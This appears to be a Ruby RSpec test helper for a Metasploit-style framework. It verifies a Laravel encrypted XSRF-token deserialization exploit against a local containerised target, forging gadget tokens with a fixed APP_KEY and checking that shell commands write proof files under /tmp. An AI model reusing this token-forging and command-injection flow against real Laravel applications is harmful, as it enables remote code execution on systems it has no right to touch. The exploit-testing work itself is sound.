# frozen_string_literal: true

require 'English'
require_relative '../laravel/commands'

# Installed PHP serialization/encryption gate the legacy four-gadget owner.
module LaravelTokenTarget
  include LaravelCommandTarget

  KEY = 'MDEyMzQ1Njc4OWFiY2RlZjAxMjM0NTY3ODlhYmNkZWY='
  WORKING_METHODS = [2, 3, 4].freeze

  def laravel_component
    'laraveltoken'
  end

  def laravel_owner
    LaravelTokenObservation::OWNER
  end

  def laravel_uid
    33
  end

  def native_argv(mode)
    target_runtime.fetch('compose') + ['exec', '-T', '--user', 'www-data', 'target', 'php', '/opt/module-target-native.php', mode]
  end

  def laravel_vendor_file
    'test/module_targets/laravel_token/vendor.json'
  end

  def native_verify(label)
    value = native('verify', {}, label)
    vendor = JSON.parse(File.read(laravel_vendor_file))
    expect(value).to include('php' => vendor.fetch('php'), 'laravel' => vendor.fetch('laravel'), 'uid' => laravel_uid, 'debug' => true, 'environment' => 'local', 'cipher' => 'AES-256-CBC', 'key' => 'base64:' + KEY)
    expect(value.fetch('source_sha256')).to eq(vendor.fetch('source_sha256'))
    expect(value.fetch('packages')).to eq(vendor.fetch('packages').transform_values { |package| package.fetch('version') })
    value
  end

  def post_token(label, token)
    endpoint = target_endpoint('target')
    uri = URI::HTTP.build(host: endpoint.fetch('host'), port: endpoint.fetch('port'), path: '/index.php')
    client = Net::HTTP.new(uri.hostname, uri.port, nil)
    client.open_timeout = 5
    client.read_timeout = 10
    request = Net::HTTP::Post.new(uri)
    request['X-XSRF-TOKEN'] = token
    response = client.start { |connection| connection.request(request) }
    artifact = format('native-http-%04d.body', @rc.fetch(:http).length)
    File.binwrite(File.join(target_runtime.fetch('artifacts'), artifact), response.body.to_s.b)
    @rc[:http] << { label: label, code: response.code.to_i, body_artifact: artifact, body_sha256: Digest::SHA256.hexdigest(response.body.to_s.b) }
    rc_save
    response
  end

  def native_control(method, command, path, content, denied: false, wrong_key: false)
    echo = "native-#{method}-#{@rc.fetch(:controls).length}"
    controlled = 'echo ' + echo + '; ' + command
    expect(file(path)).to include('exists' => false)
    generated = native('gadget', { method: method, command_base64: Base64.strict_encode64(controlled.b), wrong_key: wrong_key }, 'native-gadget')
    expect(generated.fetch('uid')).to eq(laravel_uid)
    expect(file(path)).to include('exists' => false)
    response = post_token('gadget-' + method.to_s, generated.fetch('token'))
    actual = file(path)
    @rc[:controls] << { method: method, denied: denied, wrong_key: wrong_key, echo: echo, code: response.code.to_i, proof: actual, content_base64: Base64.strict_encode64(content.b), standalone_echo: response.body.b.lines.map(&:strip).include?(echo) }
    rc_save
    if denied || wrong_key
      expect(actual).to include('exists' => false)
      expect(response.body).to include(wrong_key ? 'The MAC is invalid' : 'Unknown formatter &quot;dispatch&quot;')
      expect(response.body.b.lines.map(&:strip)).not_to include(echo)
      expect(response.body).to include(echo) unless wrong_key
    else
      expect(actual).to eq('exists' => true, 'uid' => laravel_uid, 'base64' => Base64.strict_encode64(content.b))
      expect(response.body.b.lines.map(&:strip)).to include(echo)
    end
  ensure
    primary = $ERROR_INFO
    begin
      native('remove', { path: path }, 'remove-native-proof') if path
      expect(file(path)).to include('exists' => false) if path
    rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
      (@rc[:cleanup_errors] ||= []) << { type: e.class.name, message: e.message }
      raise unless primary
    ensure
      rc_save
    end
  end

  def token_command_case(label, content, key: KEY)
    2.times do |iteration|
      path = "/tmp/module-target-laraveltoken-owner-#{Process.pid}-#{label}-#{iteration}"
      command = 'printf %s ' + Shellwords.escape(content) + ' >> ' + path
      WORKING_METHODS.each { |method| native_control(method, command, path, content) }
      console_command('back') if iteration.zero?
      console_command('use ' + laravel_owner) if iteration.zero?
      rc_json("begin;active_module.datastore['CMD']=#{command.inspect};true;end")
      options = { 'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'SSL' => false, 'APP_KEY' => key, 'DisablePayloadHandler' => true, 'WfsDelay' => 0, 'HttpClientTimeout' => 10 }
      offset = rc_json('framework.instance_variable_get(:@laraveltoken_events).length')
      output = run_target_module(laravel_owner, 'target', options, action: 'run -z', reuse_module: true, allow_errors: true)
      selection = rc_json('active_module.object_id')
      expect(selection).to eq(@selected_owner) if iteration.positive?
      @selected_owner = selection
      events = rc_json("framework.instance_variable_get(:@laraveltoken_events).drop(#{offset})")
      @rc[:calls] << { label: label, iteration: iteration, output: output, selection: selection, options: options, command_base64: Base64.strict_encode64(command.b), events: events }
      rc_save
      expect(output).not_to include('Exploit failed', 'Exploit aborted')
      # Non-session payloads try all four fallbacks; the hardened Faker path
      # cannot execute, while three independently proven native paths can.
      expect(events.select { |event| event['event'] == 'call' && event['method'] == 'generate_token' }.map { |event| event.fetch('gadget') }).to eq([1, 2, 3, 4])
      expect(file(path)).to eq('exists' => true, 'uid' => laravel_uid, 'base64' => Base64.strict_encode64((content * WORKING_METHODS.length).b))
    ensure
      rc_command('remove-owner-proof', 'target', 'rm', '-f', '--', path) if path
      expect(file(path)).to include('exists' => false) if path
      rc_save
    end
  end
end
